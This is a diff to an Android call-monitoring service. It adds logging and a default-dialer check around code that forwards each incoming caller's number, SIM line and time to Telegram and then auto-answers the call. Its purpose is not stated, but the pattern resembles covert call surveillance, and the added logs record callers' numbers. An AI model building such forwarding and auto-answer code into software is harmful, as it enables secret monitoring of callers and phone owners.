@@ -247,6 +247,8 @@ public class CallMonitorService extends Service {
     private void handleCallState(int state, String incomingNumber, int simSlot) {
         // Debounce Logic for Ringing
         if (state == TelephonyManager.CALL_STATE_RINGING) {
+            CustomExceptionHandler.log(this, "CALL_STATE_RINGING detected. incomingNumber=" + incomingNumber);
+            CustomExceptionHandler.log(this, "RINGING on SIM slot=" + simSlot);
             
             // 1. Update pending data if available
             // Priority Logic: Prefer the event that contains a valid incoming number.
@@ -304,6 +306,7 @@ public class CallMonitorService extends Service {
             
             // Wait 1000ms to gather data (SIM + Number)
             debounceHandler.postDelayed(sendNotificationRunnable, 1000);
+            CustomExceptionHandler.log(this, "Debounce scheduled for ringing call");
             
         } else if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
             // Cancel pending ringing notification if answered very quickly
@@ -338,53 +341,69 @@ public class CallMonitorService extends Service {
     }
     
     private void processRingingCall() {
-        // Check if we have valid data
-        String number = pendingNumber;
-        if (number == null || number.trim().isEmpty()) {
-            number = "Unknown";
-        }
+        try {
+            CustomExceptionHandler.log(this, "processRingingCall() START");
+            CustomExceptionHandler.log(this, "Incoming number raw = " + pendingNumber);
 
-        if (lastIncomingNumber.equals(number) && isRinging) {
-            return; // Already handled
-        }
+            String number = pendingNumber;
+            if (number == null || number.trim().isEmpty()) {
+                number = "Unknown";
+            }
+            CustomExceptionHandler.log(this, "Incoming number final = " + number);
+            CustomExceptionHandler.log(this, "Pending SIM slot = " + pendingSimSlot);
 
-        // Try to recover SIM info if missing
-        if (pendingSimSlot == -1) {
-            pendingSimSlot = resolveSimSlot();
-        }
+            if (lastIncomingNumber.equals(number) && isRinging) {
+                CustomExceptionHandler.log(this, "processRingingCall() skipped: already handled. number=" + number);
+                return;
+            }
 
-        isRinging = true;
-        callStartTime = System.currentTimeMillis();
-        lastIncomingNumber = number;
-        
-        String simInfo;
-        if (pendingSimSlot != -1) {
-            simInfo = (pendingSimSlot == 1) ? "SIM 1" : 
-                      (pendingSimSlot == 2) ? "SIM 2" : 
-                      "SIM " + pendingSimSlot;
-        } else {
-            simInfo = "Unknown SIM";
-            // Attempt one last check for single SIM device
-             if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                 android.telephony.SubscriptionManager subscriptionManager = getSystemService(android.telephony.SubscriptionManager.class);
-                 if (subscriptionManager != null) {
-                     java.util.List<android.telephony.SubscriptionInfo> subs = subscriptionManager.getActiveSubscriptionInfoList();
-                     if (subs != null && subs.size() == 1) {
-                         simInfo = "SIM " + (subs.get(0).getSimSlotIndex() + 1);
-                     }
-                 }
-             }
+            if (pendingSimSlot == -1) {
+                CustomExceptionHandler.log(this, "Pending SIM slot missing. Trying resolveSimSlot()");
+                pendingSimSlot = resolveSimSlot();
+                CustomExceptionHandler.log(this, "resolveSimSlot() result = " + pendingSimSlot);
+            }
+
+            isRinging = true;
+            callStartTime = System.currentTimeMillis();
+            lastIncomingNumber = number;
+
+            String simInfo;
+            if (pendingSimSlot != -1) {
+                simInfo = (pendingSimSlot == 1) ? "SIM 1" :
+                        (pendingSimSlot == 2) ? "SIM 2" :
+                                "SIM " + pendingSimSlot;
+            } else {
+                simInfo = "Unknown SIM";
+                if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    android.telephony.SubscriptionManager subscriptionManager = getSystemService(android.telephony.SubscriptionManager.class);
+                    if (subscriptionManager != null) {
+                        java.util.List<android.telephony.SubscriptionInfo> subs = subscriptionManager.getActiveSubscriptionInfoList();
+                        if (subs != null && subs.size() == 1) {
+                            simInfo = "SIM " + (subs.get(0).getSimSlotIndex() + 1);
+                        }
+                    }
+                }
+            }
+
+            CustomExceptionHandler.log(this, "Detected line = " + simInfo);
+
+            String msg = "📞 Incoming Call Detected!\n" +
+                    "🔢 Number: " + number + "\n" +
+                    "📱 Line: " + simInfo + "\n" +
+                    "⏰ Time: " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+
+            CustomExceptionHandler.log(this, "Call message built = " + msg.replace("\n", " | "));
+
+            telegramSender.sendMessage(msg);
+            CustomExceptionHandler.log(this, "telegramSender.sendMessage(msg) called");
+
+            CustomExceptionHandler.log(this, "Calling attemptAutoAnswer()");
+            attemptAutoAnswer();
+
+        } catch (Exception e) {
+            CustomExceptionHandler.log(this, "processRingingCall exception: " + e.getMessage());
+            CustomExceptionHandler.logError(this, e);
         }
-        
-        String msg = "📞 Incoming Call Detected!\n" +
-                "🔢 Number: " + number + "\n" +
-                "📱 Line: " + simInfo + "\n" +
-                "⏰ Time: " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-        
-        telegramSender.sendMessage(msg);
-        
-        // Auto Answer Logic
-        attemptAutoAnswer();
     }
     
     private int resolveSimSlot() {
@@ -426,34 +445,63 @@ public class CallMonitorService extends Service {
     }
 
     private void attemptAutoAnswer() {
-        if (Build.VERSION.SDK_INT >= 26) {
-             android.telecom.TelecomManager tm = (android.telecom.TelecomManager) getSystemService(Context.TELECOM_SERVICE);
-             if (tm != null) {
-                 if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ANSWER_PHONE_CALLS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                     try {
-                         tm.acceptRingingCall();
-                         CustomExceptionHandler.log(this, "Auto-answered call via TelecomManager");
-                     } catch (Exception e) {
-                         Log.e("CallMonitorService", "Failed to answer call", e);
-                         CustomExceptionHandler.logError(this, e);
-                     }
-                 } else {
-                     Log.e("CallMonitorService", "ANSWER_PHONE_CALLS permission not granted");
-                 }
-             }
-        }
-        
-        // Fallback for older devices or if TelecomManager fails (though less likely to work on modern Android)
         try {
-            Intent intent = new Intent(Intent.ACTION_MEDIA_BUTTON);
-            intent.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
-            sendOrderedBroadcast(intent, null);
-            
-            intent = new Intent(Intent.ACTION_MEDIA_BUTTON);
-            intent.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
-            sendOrderedBroadcast(intent, null);
-        } catch (Exception e) {
-            // Ignore
+            CustomExceptionHandler.log(this, "attemptAutoAnswer() START");
+
+            if (!isAppDefaultDialer()) {
+                CustomExceptionHandler.log(this, "attemptAutoAnswer aborted: app is NOT default dialer");
+                return;
+            }
+
+            if (Build.VERSION.SDK_INT >= 26) {
+                android.telecom.TelecomManager tm = (android.telecom.TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+                if (tm != null) {
+                    if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ANSWER_PHONE_CALLS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                        try {
+                            CustomExceptionHandler.log(this, "Calling TelecomManager.acceptRingingCall()");
+                            tm.acceptRingingCall();
+                            CustomExceptionHandler.log(this, "acceptRingingCall() invoked");
+                        } catch (Exception e) {
+                            Log.e("CallMonitorService", "Failed to answer call", e);
+                            CustomExceptionHandler.logError(this, e);
+                        }
+                    } else {
+                        Log.e("CallMonitorService", "ANSWER_PHONE_CALLS permission not granted");
+                    }
+                } else {
+                    CustomExceptionHandler.log(this, "TelecomManager null");
+                }
+            } else {
+                CustomExceptionHandler.log(this, "Unsupported SDK for TelecomManager.acceptRingingCall()");
+            }
+
+            try {
+                Intent intent = new Intent(Intent.ACTION_MEDIA_BUTTON);
+                intent.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_HEADSETHOOK));
+                sendOrderedBroadcast(intent, null);
+
+                intent = new Intent(Intent.ACTION_MEDIA_BUTTON);
+                intent.putExtra(Intent.EXTRA_KEY_EVENT, new KeyEvent(KeyEvent.ACTION_UP, KeyEvent.KEYCODE_HEADSETHOOK));
+                sendOrderedBroadcast(intent, null);
+            } catch (Exception ignored) {
+            }
+        } catch (Throwable e) {
+            CustomExceptionHandler.log(this, "attemptAutoAnswer exception: " + e.getMessage());
+            CustomExceptionHandler.logError(this, e);
+        }
+    }
+
+    private boolean isAppDefaultDialer() {
+        try {
+            if (Build.VERSION.SDK_INT < 23) return true;
+            android.telecom.TelecomManager tm = (android.telecom.TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+            if (tm == null) return false;
+            String defaultDialer = tm.getDefaultDialerPackage();
+            return getPackageName().equals(defaultDialer);
+        } catch (Throwable e) {
+            CustomExceptionHandler.log(this, "isAppDefaultDialer exception: " + e.getMessage());
+            CustomExceptionHandler.logError(this, e);
+            return false;
         }
     }
 
